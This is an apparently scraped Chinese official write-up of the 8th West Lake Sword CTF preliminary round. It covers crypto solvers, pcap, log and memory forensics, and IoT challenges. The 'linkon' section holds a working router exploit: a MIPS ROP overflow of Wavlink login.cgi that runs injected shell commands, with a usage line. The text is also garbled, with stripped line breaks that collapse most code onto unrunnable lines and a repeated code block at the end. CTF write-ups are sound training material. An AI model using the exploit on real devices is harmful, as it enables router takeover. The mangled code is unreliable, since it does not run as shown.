# 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（上）

> 原文: https://www.ctfiot.com/225639.html
> ID: 225639

2025年1月18日，第八届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国420所高校、758支战队、3960人集结线上初赛！

CRYPTO

CRYPTO

已悟

```pythonfor key in range(10*100000):# print(key) S1 = [i for i in range(16)] x = hashlib.sha256(str(key).encode("utf-8")).digest() random.seed(x) random.shuffle(S1)for i in range(16):id = S1[i] tmp = S1.index(id)if tmp == S1[id] and S1[id]+id == 15: print(S1[id],id) print(key) print(S1) exit(0) ```

CRYPTO

预制菜

CRYPTO

matrixRSA

```pythonfrom Crypto.Util.number import *p0 = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009e = 65537kbits = 100PR.<x> = PolynomialRing(Zmod(n))
f = p0*2^kbits+xf = f.monic()res = f.small_roots(X=2^kbits,beta=0.3)p = p0*2^kbits + int(res[0])q = n // p assert p*q == n 
```

```python
from Crypto.Util.number import *
p0 = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275
n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009
C = Matrix(Zmod(n),[
[130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941,71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757,67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615] ,[ 23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993,   9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601,  44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401] ,[ 67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572,  13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727,  95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676]
])
e = 65537kbits = 100PR.<x> = PolynomialRing(Zmod(n))

f = p0*2^kbits+xf = f.monic()res = f.small_roots(X=2^kbits,beta=0.3)p =  p0*2^kbits + int(res[0])q = n // p assert p*q == n 

gp = (p^2-1)*(p^2-p) gq = (q^2-1)*(q^2-q) g  =gp*gq

d = inverse_mod(e,g)M= C^dflag = ''for i in range(3):    for j  in range(3):       flag+=(long_to_bytes(int(M[i,j]))).decode()print(flag)```

CRYPTO

New Year Ring4

```python
[s0^4, s0^3*s1, s0^2*s1^2, ... s0, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, e0, e1, e2, e3, b]
```

DS

DS

DSASignatureData

```pythonimport pysharkimport jsonimport csv
csv_headers = ['userid', 'name', 'idcard', 'phone']
capture = pyshark.FileCapture('data.pcapng', display_filter='http')
# 打开 CSV 文件并写入数据with open('data1.csv', mode='w', newline='', encoding='utf-8') as csvfile: writer = csv.DictWriter(csvfile, fieldnames=csv_headers) writer.writeheader()
 for packet in capture: if 'HTTP' in packet: # 仅处理HTTP请求包 http_layer = packet.http # print(http_layer) # 检查是否为POST请求且包含请求体 if hasattr(http_layer, 'request_method') and http_layer.request_method == 'POST': # 提取URL中的userid url = http_layer.request_uri userid = url.split('userid=')[1].split(' ')[0] if 'userid=' in url else None # 提取POST数据 if hasattr(http_layer, 'file_data'): post_data_hex = http_layer.file_data post_data = bytes.fromhex(post_data_hex.replace(":", "")).decode() # print(post_data) json_data = json.loads(post_data) # 提取name, idcard, phone name = json_data.get('name', None) idcard = json_data.get('idcard', None) phone = json_data.get('phone', None) # 写入CSV文件 writer.writerow({ 'userid': userid, 'name': name, 'idcard': idcard, 'phone': phone })
```

```pythonimport csv
with open('data1.csv', mode='r', encoding='utf-8') as infile: reader = csv.DictReader(infile) data = list(reader)
# 使用集合去重unique_data = { (row['userid'], row['name'], row['idcard'], row['phone']) for row in data }
# 将集合转换为列表并按userid排序sorted_data = sorted(unique_data, key=lambda x: int(x[0]))
# 写入新的 CSV 文件with open('data2.csv', mode='w', newline='', encoding='utf-8') as outfile: writer = csv.writer(outfile) writer.writerow(['userid', 'name', 'idcard', 'phone']) for row in sorted_data: writer.writerow(row)
```

```pythonfrom Crypto.PublicKey import DSAfrom Crypto.Signature import DSSfrom Crypto.Hash import SHA256import csvimport base64
with open('data-sign.csv', 'r', encoding='utf-8') as f: reader = csv.reader(f) header = next(reader) sign_data = {row[0]: row for row in reader}
with open('data2.csv', 'r', encoding='utf-8') as f: reader = csv.reader(f) header = next(reader) all_data = list(reader)
# 保存验证结果with open('data-unmodify.csv', 'w', encoding='utf-8', newline='') as f_undo, open('data-modify.csv', 'w', encoding='utf-8', newline='') as f_do:
 writer_undo = csv.writer(f_undo) writer_do = csv.writer(f_do)
 writer_undo.writerow(header) writer_do.writerow(header)
 for row in all_data: userid, name, idcard, phone = row
 # Load DSA public key public_key_path = f'public/public-{str(userid).zfill(4)}.pem' with open(public_key_path, 'r') as f: public_key = DSA.import_key(f.read())
 # Get signatures from data-sign.csv sign_row = sign_data.get(userid) if not sign_row: writer_do.writerow(row) continue
 _, name_signature_base64, idcard_signature_base64, phone_signature_base64 = sign_row
 # Verify name name_hash = SHA256.new(name.encode()) name_signature = base64.b64decode(name_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(name_hash, name_signature) name_verified = True except (ValueError, TypeError): name_verified = False
 # Verify idcard idcard_hash = SHA256.new(idcard.encode()) idcard_signature = base64.b64decode(idcard_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(idcard_hash, idcard_signature) idcard_verified = True except (ValueError, TypeError): idcard_verified = False
 # Verify phone phone_hash = SHA256.new(phone.encode()) phone_signature = base64.b64decode(phone_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(phone_hash, phone_signature) phone_verified = True except (ValueError, TypeError): phone_verified = False
 if name_verified and idcard_verified and phone_verified: writer_undo.writerow(row) else: writer_do.writerow(row)
```

DS

easydatalog

```pythonimport re
with open('error.log', 'r') as f: content_all = f.read()
# 匹配出具有内容的一部分日志contents = re.findall(r'dumpio_in [readbytes-blocking](.*?)dumpio_outn', content_all, re.S)# print(contents)
with open('content_post.txt', 'w') as f: for c in contents: # print(c) # 匹配出上传的内容 r_list = re.findall(r'dumpio_in (data-HEAP): (.*?)n', c, re.S) # print(r_list) # 去除匹配到的带有 bytes 的内容 content = '' for r in r_list: if not re.findall(r'd* bytes', r): content += r # print(content) f.write(content + 'nnn')
# 分析 content_post.txt 文件，利用木马上传了俩文件，一个jpg、一个zipwith open('content_post.txt', 'r') as f: content_all = f.read()data_jpg = re.findall('(FFD8.*?FFD9)&', content_all, re.S)with open('1.jpg', 'wb') as f: f.write(bytes.fromhex(data_jpg[0]))data_zip = re.findall('(504B0304.*?)&', content_all, re.S)with open('1.zip', 'wb') as f: f.write(bytes.fromhex(data_zip[0]))```

```bash# 蚁剑特征，从第二个字符开始解密b1709fecc8bc5e=doL3Zhci93d3cvaHRtbC91cGxvYWQvcGFzc3dvcmQuanBn```

DS

easyrawencode

```bash# 获取镜像基本信息，拿到 --profile=Win7SP1x64volatility -f easyrawencode.raw imageinfo
# 查看进程volatility -f easyrawencode.raw --profile=Win7SP1x64 pstree```

```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 cmdscanvolatility -f easyrawencode.raw --profile=Win7SP1x64 consoles```

```20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334d919c229aab6535efa09a52c589c8f475b204675b1b173c32c04b0b8a100ee29```

```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 filescan | grep -i rsa```

```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x00000000061f5630 -D .mv file.None.0xfffffa800f08b510.dat private.pem
volatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003dfdf070 -D .mv file.None.0xfffffa800cee0ad0.dat hack.py
volatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003fd5bf20 -D .mv file.None.0xfffffa800da29f10.dat encrypted_data.zip```

```-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAkneyJiNWRK/CYoSUOVpEqARdZF7XYkeIl83CQXumaerjoqshfZezq6oLiaKBj3ljmR2HzwYAEBDVQCc4QE7ZcLfQ11ra8/l8K451ax0hGI4bnPoPiS7ticYCO9U5PygwxF4OK6sscf8rD1XauVzY/i32sytvSeh4uWWWJFS55klI4AmALeBa2+KcOiXIJoSmeU5JRKq+u6JKJheCli6FY/ouEsgpI0vIdNBnpFQLNX7xo/KhJoysBN/pV0baJ7CY/9mZfdLo+O99NWHkfoGouaWMzgy8xPrXyHI8Tw3E8mm1k2q2jzYrfoTBrfAlHNNvD3ucIvJXdpl0vg/FoTgcMQIDAQABAoIBAB7XQOYqcS8f4jq753knIodNefvZQ5mQbfjnDNUcjAdH/DxDtBbdw2mtceX+l7DmEtyKHQ9w2EEJxlmOmJfj8oG7VuiN20ZdvXFvexZ9qPsiazqT5gMRJFfrH4vJQ1di51fl5S55Se/MFt1RCvAWlqN4+rYx+mpR3t/M/f8y7v0IFlbC9fh6C6Qb7NQIvZUiqP0bzolCQQUEjrX77/qTfiozUDttuBJtdyuRnYc1jx43Pw4hsH76Fdgp/BRbq8ejbW88CyQUSKrPgEf7X7JIms1+RiAytaKdq4ovk8H27fd6XIMLLL7Un8cpBWZ/5CrrMgsTMoxub2gYfisyPM/N2kUCgYEAvl2/CGRq7Gx4aNgsXGB9bQznQfK2W6ptMypRm+3GiJYcbO9qYS1XeRd+PA3oN3dv9ynVsmuC2gOYHcx40LTc2uv7l6BVA5XF34iXihMKBjj1FMBdncrDYIfmBjsJAsQPFh7Jf6DxiFUTtFZbGaxvp1cGvUKI/Ooggqn3kzZMtz0CgYEAxPdVT7Qy60Re2m+OmhC89R0LeMb29w2ihwuHiHSOd5vNTQgnIAGJ7VlwQh8Ac7/eqDuvJR6GtGqDtxLzeGt9r/nNqoZHrj4ZW92KLVjZst9HnuxPIuK5sP63k00Xk0DUU8meMwVgObP+cno8HMh8lWjglcYVT6Y/EhgYESLjKAUCgYEAohMEkuuT0Shkt7bcxeVsxAyJU6+GLLMD99ze0Gf3cNCE8QZBRu0onTMwSYb5n0ez7vYSN66rIFyRBUXR0rc5lbX2ZVifKMc6SZ9sjaS6EyQpHPrOeYppH2V0pPdcK5uq0IVzvpLTMORmO1KOi2QxR4KjfT0JjnLzLOvymcZQOG0CgYAT/THYO+Zq/+5MZsPnGMnEamUupaqMmgKjh+UCUSngM5ybM7ecxOs1fj0pSLIoDRHQqvX0Y2uyRZkGbFLvJqGDyWs44hXGNiEmtI4AWiMFxykilMLXPIEx2DfTKCC7XfnuYui+Ls58LKsm/Qa6uRIDq7gXGxowkiOWd4GBw7Of7QKBgQCCQG+iNPF06zn94Iasqz0ELv/iLUoIM2WSTmVIIjlCpP3khJssaCQk4wyx+0G+CoOILbDnl+mtNWRR+a09LCNjyedEl+7zsxZUCmFH4jljBoXAspw31MwmNXeRkCLNVmoZYAEuJ47SGV5ImKx05fJGV3d8M557pzYsKOzhyMhYMg==-----END RSA PRIVATE KEY-----```

```pythonimport osimport hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSA
hackkey = os.getenv('hackkey')if not hackkey: raise ValueError("Environment variable 'hackkey' is not set")
with open('private.pem', 'r') as f: private_key = RSA.import_key(f.read())public_key = private_key.publickey().export_key()
aes_key = hashlib.sha256(hackkey.encode()).digest()
with open('data.csv', 'rb') as f: data = f.read()
cipher_aes = AES.new(aes_key, AES.MODE_EAX)ciphertext, tag = cipher_aes.encrypt_and_digest(data)cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))enc_aes_key = cipher_rsa.encrypt(aes_key)
with open('encrypted_data.bin', 'wb') as f: f.write(ciphertext) print(enc_aes_key.hex())print(cipher_aes.nonce.hex())print(tag.hex())```

```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 envars | grep -i hackkey```

```pythonprint(enc_aes_key.hex())print(cipher_aes.nonce.hex())print(tag.hex())```

```pythonimport osimport hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSA
hackkey = '4etz0hHbU3TgKqduFL'
with open('private.pem', 'rb') as f: private_key = RSA.import_key(f.read())
with open('encrypted_data.bin', 'rb') as f: ciphertext = f.read()
enc_aes_key = bytes.fromhex('20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334')nonce = bytes.fromhex('d919c229aab6535efa09a52c589c8f47')tag = bytes.fromhex('5b204675b1b173c32c04b0b8a100ee29')
cipher_rsa = PKCS1_OAEP.new(private_key)aes_key = cipher_rsa.decrypt(enc_aes_key)
derived_aes_key = hashlib.sha256(hackkey.encode()).digest()if aes_key != derived_aes_key: raise ValueError("Decryption failed: AES key mismatch")
cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)data = cipher_aes.decrypt_and_verify(ciphertext, tag)
with open('data.csv', 'wb') as f: f.write(data)
```

```编号,用户名,密码,姓名,性别,出生日期,个性签名(加密版)1,sWEbvrLvgyFO9u8,vHBhvVXS2JvLnTTo,胜屠翰池,男,19761023,korvy4fjEBP6AKeDValKDfzBRK9sKDSIHVakq3NXMMU32,wangguizhi,3E8vleDJFC,桓玉珂,女,20050814,NF+z3NevQqWILNqNvUznlOFie3KLuhIztQNLFnRy3,kofxlSO1C3XEXP3QPH1lEg5WQ,4U86p3uzw7xV,崎邱炜,男,20000710,yutW+1ipTbce3pcz+BEIBS48fX7NF5hh8bWEdigYsHca3vo/dQ0Nl+YFmpl5UD4Onga0hGehitNvMrG4XNFdH+lHEg==```

```pythonimport pandas as pdfrom Crypto.Cipher import ARC4import base64
def decrypt_rc4(ciphertext, key): cipher = ARC4.new(key.encode()) decrypted_data = cipher.decrypt(base64.b64decode(ciphertext)) return decrypted_data.decode('utf-8')
df = pd.read_csv('data.csv')df['个性签名(解密版)'] = df.apply(lambda row: decrypt_rc4(row['个性签名(加密版)'], row['密码']), axis=1)df.to_csv('data_decode.csv', index=False)
```

IOT

IOT

blink

IOT

easy-uboot

```qemu-system-x86_64 -cpu qemu64-v1 -bios u-boot.rom -drive file=./uboot.disk,format=raw,if=ide -nographic```

```load ide 0:2 0x0000000 flagmd 0```

IOT

linkon

```cint check_csrf_referer(){const char *v0; // $s5const char *v1; // $s7int v2; // $v0const char *v3; // $s2const char *v4; // $s6char *v5; // $s1char *v6; // $s4const char *v7; // $fpint result; // $v0 FILE *v9; // $s0 FILE *v10; // $s0bool v11; // dc
 v0 = (const char *)nvram_bufget(0, "SYS_DOMAIN1"); v1 = (const char *)nvram_bufget(0, "SYS_DOMAIN2"); v3 = (const char *)nvram_bufget(0, "lan_ipaddr"); v2 = get_wanif_name(); v4 = (const char *)get_ipaddr(v2); v5 = getenv("HTTP_REFERER"); v6 = getenv("HTTP_HOST"); v7 = (const char *)nvram_bufget(0, "MeshMode");if ( !access("/tmp/web_log", 0) ) { v10 = fopen("/dev/console", "w+");if ( v10 ) {fprintf(v10, "%s:%s:%d:http_host-- %snn", "utils.c", "check_csrf_referer", 2101, v6); fclose(v10); } }if ( !access("/tmp/web_log", 0) ) { v9 = fopen("/dev/console", "w+");if ( v9 ) {fprintf( v9,"%s:%s:%d:http_refer-- %s ipv4_lan== %s ipv4_wan== %s domain1== %s domain2== %snn","utils.c","check_csrf_referer",2102, v5, v3, v4, v0, v1); fclose(v9); } }if ( !v5 )return -1;if ( strstr(v5, v3) )return 0; v11 = strstr(v5, v0) != 0; result = 0;if ( !v11 ) { v11 = strstr(v5, v1) != 0; result = 0;if ( !v11 ) { v11 = strstr(v5, v4) != 0; result = 0;if ( !v11 ) { v11 = strcmp(v7, "2") != 0; result = -1;if ( !v11 ) { v11 = strstr(v6, v3) != 0; result = 0;if ( !v11 ) { v11 = strstr(v6, v0) != 0; result = 0;if ( !v11 ) { v11 = strstr(v6, v1) != 0; result = 0;if ( !v11 ) {if ( strstr(v6, v4) )return 0;return -1; } } } } } } }return result;}
```

```pythonimport requestsfrom pwn import *import sys#context.log_level="debug"
libwebutil_base=0x77e1e000
if len(sys.argv)!=3: print("Usage: python %s ip "command""%sys.argv[0]) exit(0)
ip= sys.argv[1]cmd= sys.argv[2]
'''.text:00007970 28 00 BC 8F lw $gp, 0x28($sp).text:00007974 00 00 00 00 nop.text:00007978 C8 80 99 8F la $t9, do_system.text:0000797C 00 00 00 00 nop.text:00007980 09 F8 20 03 jalr $t9 ; do_system.text:00007984 move $a0, $s0'''
fmt=libwebutil_base+0x578b8 #"%s"#fmt=libwebutil_base+0x578d0rop=libwebutil_base+0x7970gp=libwebutil_base+0x5d550 #fix $gp
cmd=b"a;"+cmd.encode()+b";x00"
#payload=b"page=Goto_chidx&wlanUrl="#payload+=b"a"*(140-12)payload=b"a"*(128)#payload+=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"payload+=p32(fmt)+b"b"*8payload+=p32(rop)+b"c"*40+p32(gp)+cmd
Head = {'Referer': 'wifi.wavlink.com'}url = "http://%s/cgi-bin/login.cgi"%ipData = {"page":"Goto_chidx","wlanUrl":payload}
response = requests.post(url,headers=Head,data=Data)
print(response.text)print(response)
#python exp.py 127.0.0.1 'echo `cat /flag` >> /etc_ro/lighttpd/www/login.shtml'

```

```python exp.py 127.0.0.1 'echo `cat /flag` >> /etc_ro/lighttpd/www/login.shtml'```

IOT

sharkp

```小李的摄像头被黑客入侵了，但只捕获到了单向的流量包，请分析摄像头固件与对应的流量，回答以下问题：攻击者利用摄像头哪个接口实现的RCE？攻击者回连的C2服务器ip地址是什么？
flag格式：flag{接口名称_ip地址} 例：flag{qweasd_127.0.0.1}```

往期精选

八载磨剑西湖畔，网安群英问鼎时——第八届西湖论剑大赛今日正式启动报名

2024-12-20

热血青春，仗剑天涯！第八届西湖论剑网络安全技能大赛报名火热进行中！

2025-01-06

今日截止！第八届西湖论剑大赛报名将于今日18:00截止~

2025-01-12


```
```pythonfor key in range(10*100000):# print(key) S1 = [i for i in range(16)] x = hashlib.sha256(str(key).encode("utf-8")).digest() random.seed(x) random.shuffle(S1)for i in range(16):id = S1[i] tmp = S1.index(id)if tmp == S1[id] and S1[id]+id == 15: print(S1[id],id) print(key) print(S1) exit(0) ```
```



```
```pythonfrom Crypto.Util.number import *p0 = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009e = 65537kbits = 100PR.<x> = PolynomialRing(Zmod(n))
f = p0*2^kbits+xf = f.monic()res = f.small_roots(X=2^kbits,beta=0.3)p = p0*2^kbits + int(res[0])q = n // p assert p*q == n 
```
```



```
```python
from Crypto.Util.number import *
p0 = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275
n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009
C = Matrix(Zmod(n),[
[130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941,71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757,67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615] ,[ 23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993,   9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601,  44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401] ,[ 67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572,  13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727,  95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676]
])
e = 65537kbits = 100PR.<x> = PolynomialRing(Zmod(n))

f = p0*2^kbits+xf = f.monic()res = f.small_roots(X=2^kbits,beta=0.3)p =  p0*2^kbits + int(res[0])q = n // p assert p*q == n 

gp = (p^2-1)*(p^2-p) gq = (q^2-1)*(q^2-q) g  =gp*gq

d = inverse_mod(e,g)M= C^dflag = ''for i in range(3):    for j  in range(3):       flag+=(long_to_bytes(int(M[i,j]))).decode()print(flag)```
```



```
```python
[s0^4, s0^3*s1, s0^2*s1^2, ... s0, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, e0, e1, e2, e3, b]
```
```



```
```pythonimport pysharkimport jsonimport csv
csv_headers = ['userid', 'name', 'idcard', 'phone']
capture = pyshark.FileCapture('data.pcapng', display_filter='http')
# 打开 CSV 文件并写入数据with open('data1.csv', mode='w', newline='', encoding='utf-8') as csvfile: writer = csv.DictWriter(csvfile, fieldnames=csv_headers) writer.writeheader()
 for packet in capture: if 'HTTP' in packet: # 仅处理HTTP请求包 http_layer = packet.http # print(http_layer) # 检查是否为POST请求且包含请求体 if hasattr(http_layer, 'request_method') and http_layer.request_method == 'POST': # 提取URL中的userid url = http_layer.request_uri userid = url.split('userid=')[1].split(' ')[0] if 'userid=' in url else None # 提取POST数据 if hasattr(http_layer, 'file_data'): post_data_hex = http_layer.file_data post_data = bytes.fromhex(post_data_hex.replace(":", "")).decode() # print(post_data) json_data = json.loads(post_data) # 提取name, idcard, phone name = json_data.get('name', None) idcard = json_data.get('idcard', None) phone = json_data.get('phone', None) # 写入CSV文件 writer.writerow({ 'userid': userid, 'name': name, 'idcard': idcard, 'phone': phone })
```
```



```
```pythonimport csv
with open('data1.csv', mode='r', encoding='utf-8') as infile: reader = csv.DictReader(infile) data = list(reader)
# 使用集合去重unique_data = { (row['userid'], row['name'], row['idcard'], row['phone']) for row in data }
# 将集合转换为列表并按userid排序sorted_data = sorted(unique_data, key=lambda x: int(x[0]))
# 写入新的 CSV 文件with open('data2.csv', mode='w', newline='', encoding='utf-8') as outfile: writer = csv.writer(outfile) writer.writerow(['userid', 'name', 'idcard', 'phone']) for row in sorted_data: writer.writerow(row)
```
```



```
```pythonfrom Crypto.PublicKey import DSAfrom Crypto.Signature import DSSfrom Crypto.Hash import SHA256import csvimport base64
with open('data-sign.csv', 'r', encoding='utf-8') as f: reader = csv.reader(f) header = next(reader) sign_data = {row[0]: row for row in reader}
with open('data2.csv', 'r', encoding='utf-8') as f: reader = csv.reader(f) header = next(reader) all_data = list(reader)
# 保存验证结果with open('data-unmodify.csv', 'w', encoding='utf-8', newline='') as f_undo, open('data-modify.csv', 'w', encoding='utf-8', newline='') as f_do:
 writer_undo = csv.writer(f_undo) writer_do = csv.writer(f_do)
 writer_undo.writerow(header) writer_do.writerow(header)
 for row in all_data: userid, name, idcard, phone = row
 # Load DSA public key public_key_path = f'public/public-{str(userid).zfill(4)}.pem' with open(public_key_path, 'r') as f: public_key = DSA.import_key(f.read())
 # Get signatures from data-sign.csv sign_row = sign_data.get(userid) if not sign_row: writer_do.writerow(row) continue
 _, name_signature_base64, idcard_signature_base64, phone_signature_base64 = sign_row
 # Verify name name_hash = SHA256.new(name.encode()) name_signature = base64.b64decode(name_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(name_hash, name_signature) name_verified = True except (ValueError, TypeError): name_verified = False
 # Verify idcard idcard_hash = SHA256.new(idcard.encode()) idcard_signature = base64.b64decode(idcard_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(idcard_hash, idcard_signature) idcard_verified = True except (ValueError, TypeError): idcard_verified = False
 # Verify phone phone_hash = SHA256.new(phone.encode()) phone_signature = base64.b64decode(phone_signature_base64) try: DSS.new(public_key, 'fips-186-3').verify(phone_hash, phone_signature) phone_verified = True except (ValueError, TypeError): phone_verified = False
 if name_verified and idcard_verified and phone_verified: writer_undo.writerow(row) else: writer_do.writerow(row)
```
```



```
```pythonimport re
with open('error.log', 'r') as f: content_all = f.read()
# 匹配出具有内容的一部分日志contents = re.findall(r'dumpio_in [readbytes-blocking](.*?)dumpio_outn', content_all, re.S)# print(contents)
with open('content_post.txt', 'w') as f: for c in contents: # print(c) # 匹配出上传的内容 r_list = re.findall(r'dumpio_in (data-HEAP): (.*?)n', c, re.S) # print(r_list) # 去除匹配到的带有 bytes 的内容 content = '' for r in r_list: if not re.findall(r'd* bytes', r): content += r # print(content) f.write(content + 'nnn')
# 分析 content_post.txt 文件，利用木马上传了俩文件，一个jpg、一个zipwith open('content_post.txt', 'r') as f: content_all = f.read()data_jpg = re.findall('(FFD8.*?FFD9)&', content_all, re.S)with open('1.jpg', 'wb') as f: f.write(bytes.fromhex(data_jpg[0]))data_zip = re.findall('(504B0304.*?)&', content_all, re.S)with open('1.zip', 'wb') as f: f.write(bytes.fromhex(data_zip[0]))```
```



```
```bash# 蚁剑特征，从第二个字符开始解密b1709fecc8bc5e=doL3Zhci93d3cvaHRtbC91cGxvYWQvcGFzc3dvcmQuanBn```
```



```
```bash# 获取镜像基本信息，拿到 --profile=Win7SP1x64volatility -f easyrawencode.raw imageinfo
# 查看进程volatility -f easyrawencode.raw --profile=Win7SP1x64 pstree```
```



```
```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 cmdscanvolatility -f easyrawencode.raw --profile=Win7SP1x64 consoles```
```



```
